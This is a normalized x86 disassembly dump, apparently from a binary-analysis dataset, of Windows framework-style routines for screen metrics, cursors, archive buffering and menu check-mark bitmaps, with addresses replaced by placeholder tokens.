mov esi [ GetSystemMetrics@IAT ]
push edi
push 0xb
mov edi ecx
call esi
push 0xc
mov [ edi + 0x8 ] eax
call esi
push 0x2
mov [ edi + 0xc ] eax
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
push 0x0
mov [ rw-data ] eax
call [ GetDC@IAT ]
mov esi [ GetDeviceCaps@IAT ]
mov ebx eax
push 0x58
push ebx
call esi
push 0x5a
push ebx
mov [ edi + 0x18 ] eax
call esi
push ebx
push 0x0
mov [ edi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_40ca85
mov edi edi
push ebx
push esi
push edi
mov esi ecx
call sub_40ca29
xor ebx ebx
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_40c9e3
mov edi [ LoadCursorW@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
push 0x2
mov [ esi + 0x40 ] eax
pop eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
pop edi
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
mov eax esi
pop esi
pop ebx
retn
sub_40cace
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi ecx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417be7
pop ecx
pop ecx
mov esi eax
push esi
mov ecx edi
call sub_40b495
push [ ebp + 0xc ]
lea ecx [ esi + 0x1 ]
push [ ebp + 0x8 ]
push ecx
push eax
call sub_417d86
add esp 0x10
push esi
mov ecx edi
call sub_40b0b3
pop edi
pop esi
pop ebp
retn 0x8
push 0x80070057
call sub_40aa1e
sub_40cb59
lea ecx [ ebp - 0x418 ]
call sub_40b45e
mov esi [ ebp - 0x41c ]
mov eax [ esi ]
xor edi edi
push edi
push 0x200
lea ecx [ ebp - 0x414 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x38
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x14
lea eax [ ebp - 0x414 ]
push eax
push 0x38
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x18
jmp r-xdata
push edi
push edi
mov edi [ ebp - 0x418 ]
push edi
call sub_40bfa2
lea ecx [ edi - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b038
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax r-xdata
retn
sub_40cc18
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_40a7dd
cmp [ ebp + 0x10 ] 0x0
je r-xdata
imul eax [ ebp + 0x10 ]
add eax 0x4
push eax
call sub_40a5cc
pop ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
pop ebp
retn 0xc
sub_40cc72
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414f2e
push eax
call sub_40a828
add esp 0x14
pop ebp
retn
sub_40cc93
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
test [ esi + 0x18 ] 0x1
jne r-xdata
pop esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x28 ]
push edi
mov edi [ esi + 0x2c ]
sub edi eax
cmp ebx edi
jae r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_40d3b3
push edi
push eax
push ebx
push [ ebp + 0x8 ]
call sub_40c024
add [ esi + 0x28 ] edi
add [ ebp + 0x8 ] edi
add esp 0x10
sub ebx edi
je r-xdata
mov edi ebx
mov eax [ ebp + 0xc ]
sub eax ebx
pop edi
xor edx edx
mov eax ebx
div [ esi + 0x20 ]
mov edi ebx
sub edi edx
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] edi
sub ebx [ ebp - 0x8 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push [ ebp - 0x4 ]
mov ecx [ esi + 0x24 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
test eax eax
jbe r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
lea eax [ esi + 0x2c ]
push eax
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x0
call [ edx + 0x50 ]
mov eax [ edi ]
cmp [ esi + 0xc ] edi
jne r-xdata
push edi
push eax
push ebx
push [ ebp + 0x8 ]
call sub_40c024
add [ esi + 0x28 ] edi
add esp 0x10
sub ebx edi
mov edi ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
cmp ebx eax
jbe r-xdata
mov eax [ esi + 0x30 ]
lea ecx [ eax + edi ]
mov [ esi + 0x2c ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ esi + 0x30 ]
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x2c ]
sub edi eax
mov [ esi + 0x28 ] eax
cmp ebx edi
jae r-xdata
cmp edi ebx
jb r-xdata
push [ ebp - 0x4 ]
mov ecx [ esi + 0x24 ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_40cdc4
mov edi edi
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
mov eax [ esi + 0x28 ]
push edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
lea edi [ esi + 0x30 ]
mov edx [ edi ]
push ebx
jne r-xdata
mov edx [ esi + 0x2c ]
cmp edx eax
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
mov eax [ esi + 0x2c ]
jmp r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
sub eax edx
cdq
push 0x1
push edx
push eax
call [ edi + 0x28 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
lea edx [ esi + 0x2c ]
push edx
push edi
push [ esi + 0x20 ]
push 0x1
call [ eax + 0x50 ]
mov ecx [ esi + 0x24 ]
mov ebx [ ecx ]
push 0x0
push 0x0
sub eax edx
push eax
push 0x2
call [ ebx + 0x50 ]
mov eax [ edi ]
pop ebx
mov ecx [ esi + 0x24 ]
mov ebx [ ecx ]
sub eax edx
push eax
push edx
call [ ebx + 0x38 ]
jmp r-xdata
pop edi
mov [ esi + 0x28 ] eax
pop esi
retn
sub_40ce3c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
push edi
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ ebp + 0x8 ]
lea ebx [ esi + 0x2c ]
mov ecx [ ebx ]
mov edi ecx
sub edi edx
add eax edi
cmp [ esi + 0x8 ] 0x0
mov [ ebp - 0x8 ] eax
jne r-xdata
push [ esi + 0x14 ]
push 0x4
test edi edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp edx eax
jbe r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
push ebx
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x0
call [ eax + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x28 ] eax
mov ecx [ esi + 0x24 ]
mov eax edi
neg eax
cdq
push 0x1
push edx
push eax
mov eax [ ecx ]
call [ eax + 0x28 ]
mov eax [ ebx ]
sub eax [ esi + 0x28 ]
pop edi
pop esi
pop ebx
cmp eax [ ebp - 0x8 ]
jae r-xdata
test edi edi
jle r-xdata
leave
retn 0x4
push 0x0
push 0x3
jmp r-xdata
cmp [ esi + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
jne r-xdata
push edi
push edx
sub ecx eax
push ecx
push eax
call sub_40cc72
mov eax [ esi + 0x30 ]
lea ecx [ eax + edi ]
add esp 0x10
mov [ esi + 0x28 ] eax
mov [ ebx ] ecx
call sub_40d3b3
sub ecx edi
mov [ ebp + 0x8 ] ecx
add edi eax
mov ecx [ esi + 0x20 ]
mov eax [ esi + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x28 ] eax
add eax ecx
mov [ ebx ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
push [ ebp + 0x8 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
push edi
call [ eax + 0x34 ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0x8 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_40cf2b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
inc eax
inc eax
cmp eax [ esi + 0x2c ]
jbe r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_40d3b3
mov eax [ esi + 0x28 ]
mov cx [ ebp + 0x8 ]
mov [ eax ] cx
add [ esi + 0x28 ] 0x2
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_40cdc4
sub_40cf6a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
add eax 0x4
cmp eax [ esi + 0x2c ]
jbe r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_40d3b3
mov eax [ esi + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
add [ esi + 0x28 ] 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_40cdc4
sub_40cfa8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
lea edx [ eax + 0x2 ]
cmp edx ecx
jbe r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_40d3b3
mov eax [ esi + 0x28 ]
mov ax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi + 0x28 ] 0x2
mov eax esi
pop esi
pop ebp
retn 0x4
sub eax ecx
inc eax
inc eax
push eax
mov ecx esi
call sub_40ce3c
sub_40cff0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
lea edx [ eax + 0x4 ]
cmp edx ecx
jbe r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_40d3b3
mov eax [ esi + 0x28 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x28 ] 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
sub eax ecx
add eax 0x4
push eax
mov ecx esi
call sub_40ce3c
sub_40d037
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
call sub_40bc2a
push 0x0
mov esi eax
call sub_40ae76
mov esi [ esi + 0x1c ]
jmp r-xdata
call sub_40a7dd
test esi esi
jne r-xdata
push [ esi ]
push [ ebp + 0x8 ]
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
push esi
call sub_40aee8
xor eax eax
push 0x0
call sub_40aee8
mov eax esi
jmp r-xdata
mov esi [ esi + 0x14 ]
pop esi
pop ebp
retn 0x4
sub_40d089
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_40cfa8
movzx eax [ ebp - 0x48 ]
mov [ esi ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_40cfa8
cmp [ ebp - 0x48 ] 0x40
jae r-xdata
movzx esi [ ebp - 0x48 ]
push esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx edi
call sub_40cc93
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp + esi - 0x44 ] 0x0
call sub_40d037
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_414a33
leave
retn 0x8
sub_40d100
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ esi + 0x2c ]
sub eax ecx
push edi
mov edi ebx
cmp ebx eax
jb r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_40d3b3
push edi
push [ ebp + 0x8 ]
push eax
push ecx
call sub_40c024
add [ esi + 0x28 ] edi
add [ ebp + 0x8 ] edi
add esp 0x10
sub ebx edi
je r-xdata
mov edi eax
pop edi
mov ecx esi
call sub_40cdc4
xor edx edx
mov eax ebx
div [ esi + 0x20 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
mov edi ebx
sub edi edx
push edi
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
add [ ebp + 0x8 ] edi
sub ebx edi
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp ebx [ esi + 0x20 ]
jb r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
lea eax [ esi + 0x2c ]
push eax
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x1
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x28 ]
cmp eax [ esi + 0x30 ]
jne r-xdata
call sub_40a7dd
push ebx
push [ ebp + 0x8 ]
push ebx
push eax
call sub_40c024
add esp 0x10
add [ esi + 0x28 ] ebx
sub_40d1c7
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
push esi
mov esi ecx
cmp [ ebp + 0x8 ] eax
jae r-xdata
push eax
call sub_40cf2b
push [ ebp + 0x8 ]
mov ecx esi
call sub_40cf6a
push [ ebp + 0x8 ]
call sub_40cf2b
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_40d1f8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi ecx
call sub_40cfa8
mov eax 0xffff
cmp [ ebp - 0x4 ] ax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_40cff0
mov eax [ ebp - 0x4 ]
movzx eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn
sub_40d22c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
push [ esi ]
call [ lstrlenA@IAT ]
mov ecx [ ebp + 0x8 ]
movzx edi ax
movzx eax [ esi + 0x8 ]
push edi
push eax
call sub_40cf2b
mov ecx eax
call sub_40cf2b
mov ecx [ ebp + 0x8 ]
movzx eax di
push eax
push [ esi ]
call sub_40d100
pop edi
pop esi
pop ebp
retn 0x4
sub_40d269
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40cc93
cmp eax [ ebp + 0xc ]
je r-xdata
pop ebp
retn 0x8
push 0x0
push 0x3
call sub_40d3b3
sub_40d291
push 0xc
mov eax sub_425bd6
call sub_415bf3
mov esi ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_40b45e
lea eax [ esi + 0xc ]
push eax
lea ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b337
mov edi [ ebp + 0x10 ]
cmp [ edi - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0xf1b0
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push edi
add eax 0xf1b0
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4131b9
push 0xffffffff
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a854
add esp 0x10
lea ecx [ edi - 0x10 ]
call sub_40b038
mov ecx [ ebp - 0x14 ]
add ecx 0xfffffff0
call sub_40b038
xor eax eax
inc eax
jmp r-xdata
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_40b6c0
mov edi [ ebp + 0x10 ]
call sub_415c98
retn 0xc
sub_40d342
push 0x4
mov eax sub_425bfc
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_40a878
lea edi [ esi + 0xc ]
mov ecx edi
mov [ esi ] r--data
call sub_40b45e
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ esi + 0x8 ] eax
call sub_40b741
mov eax esi
call sub_415c98
retn 0x8
sub_40d386
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
sub ecx 0x10
mov [ esi ] r--data
call sub_40b038
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_40d3b3
push 0x8
mov eax sub_425c20
call sub_415bc0
push 0x10
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
call sub_415cca
int3
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d342
sub_40d3f6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x20 ]
push ebx
xor ebx ebx
inc ebx
test eax eax
je r-xdata
call sub_40a7dd
mov eax [ ebp + 0x1c ]
add eax 0xffffffc7
push esi
cmp eax 0xb
ja r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax ebx
jmp r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_40d4fe ]
pop ebx
pop ebp
retn 0x1c
call [ ebp + 0x14 ]
jmp r-xdata
call [ ebp + 0x14 ]
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
push [ ebp + 0x18 ]
jmp r-xdata
push [ ebp + 0x18 ]
mov eax ebx
jmp r-xdata
mov ebx eax
call [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
push esi
call [ ebp + 0x14 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
call [ ebp + 0x14 ]
jmp r-xdata
pop esi
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
sub_40d52e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx ecx
cmp eax 0xfffffffe
jne r-xdata
push esi
push edi
cmp eax 0xfffffffd
jne r-xdata
call sub_40bc2a
cmp [ eax + 0x3c ] 0x0
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
test edi edi
je r-xdata
call sub_40bc2a
push [ ebp + 0x14 ]
mov eax [ eax + 0x3c ]
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
mov ecx eax
push ebx
call [ edx + 0x4 ]
jmp r-xdata
call sub_40a7dd
mov edi 0x111
mov edi eax
movzx eax ax
shr edi 0x10
mov [ ebp + 0xc ] eax
test edi edi
jne r-xdata
mov eax [ edi + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
call [ eax + 0x2c ]
mov ebx eax
jmp r-xdata
pop ebx
pop ebp
retn 0x10
mov esi eax
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push edi
push [ esi + 0x4 ]
call sub_40e6c7
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call sub_40d3f6
jmp r-xdata
call [ esi ]
mov esi [ ebx + 0x4 ]
jmp r-xdata
pop edi
pop esi
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov ebx [ ebx ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push eax
push [ ebp + 0x10 ]
call sub_40c8cb
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ ebp + 0xc ] 0x1
jmp r-xdata
sub_40d67d
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_40d6f1
mov edi edi
push esi
mov esi ecx
call sub_40bc2a
mov [ esi + 0x1c ] eax
xor eax eax
inc eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x18 ] ecx
mov eax esi
pop esi
retn
sub_40d75a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
call sub_40a7dd
cmp [ ebp + 0x8 ] ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
push [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
call sub_412bc5
push edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x20 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
neg edx
sbb edx edx
and edx 0xfffffffd
add edx 0x3
or edx 0x400
push edx
push eax
call sub_40d6bb
jmp r-xdata
pop edi
push [ edi + 0x20 ]
call [ GetParent@IAT ]
push eax
call sub_4100ae
push ebx
push ebx
push 0x28
push [ eax + 0x20 ]
call [ SendMessageW@IAT ]
mov [ esi + 0x18 ] 0x1
sub_40d7e8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
call sub_40a7dd
push edi
mov edi [ SendMessageW@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x20 ]
call edi
test eax 0x2000
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
pop edi
mov eax [ esi + 0x14 ]
push 0x0
push [ ebp + 0x8 ]
push 0xf1
push [ eax + 0x20 ]
call edi
mov edx [ ebp + 0x8 ]
neg edx
sbb edx edx
and edx 0x8
or edx 0x400
push edx
push eax
call sub_40d6a3
jmp r-xdata
sub_40d85e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
call sub_40a7dd
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call sub_412c6e
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
mov ecx [ esi + 0x8 ]
and eax 0xfffff6fb
cmp ecx [ esi + 0x20 ]
jae r-xdata
push [ ebp + 0x8 ]
or eax edi
push [ esi + 0x4 ]
push eax
push ecx
mov ecx [ esi + 0xc ]
call sub_40d6d3
pop edi
jmp r-xdata
sub_40d8cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ecx ax
shr eax 0x10
cmp ecx 0x4
movsx ebx ax
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] ebx
jle r-xdata
call sub_40a7dd
cmp ebx 0x5
jg r-xdata
cmp ecx 0x20
jle r-xdata
lea eax [ ecx - 0x4 ]
cdq
sub eax edx
lea esi [ ecx + 0xf ]
sar esi 0x4
mov edi eax
sar edi 0x1
mov eax esi
shl eax 0x4
add edi eax
sub edi ecx
cmp edi 0xc
jle r-xdata
push 0x20
pop ecx
mov [ ebp - 0x8c ] ecx
cmp ebx 0x20
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x84 ]
push 0xff
push eax
call sub_415f60
lea eax [ ebx - 0x6 ]
sar eax 0x1
imul eax esi
add esp 0xc
lea eax [ ebp + eax * 2 - 0x84 ]
mov edx r--data
add esi esi
mov [ ebp - 0x90 ] 0x5
push 0x20
pop ebx
mov [ ebp - 0x88 ] ebx
movzx bx [ edx ]
mov ecx edi
shl bx cl
inc edx
not bx
movzx ecx bx
mov ebx ecx
shr ebx 0x8
mov [ eax ] bl
mov [ eax + 0x1 ] cl
add eax esi
dec [ ebp - 0x90 ]
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push 0x1
push 0x1
push [ ebp - 0x88 ]
push [ ebp - 0x8c ]
call [ CreateBitmap@IAT ]
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapW@IAT ]
mov [ rw-data ] eax
sub_40d9ed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor ecx ecx
xor edi edi
cmp [ ebp + 0x8 ] edi
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
cmp [ rw-data ] edi
jne r-xdata
call sub_40a7dd
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_40d8cb
cmp [ rw-data ] edi
je r-xdata
sub_40da55
push 0x4
mov eax sub_425c5c
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push 0x40
mov [ esi ] r--data
push [ edi + 0x4 ]
lea ecx [ esi + 0x4 ]
call sub_4131d3
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x1c ]
call sub_40c508
lea ebx [ esi + 0x38 ]
push 0x4
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_40c508
xor eax eax
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0xc ] eax
jne r-xdata
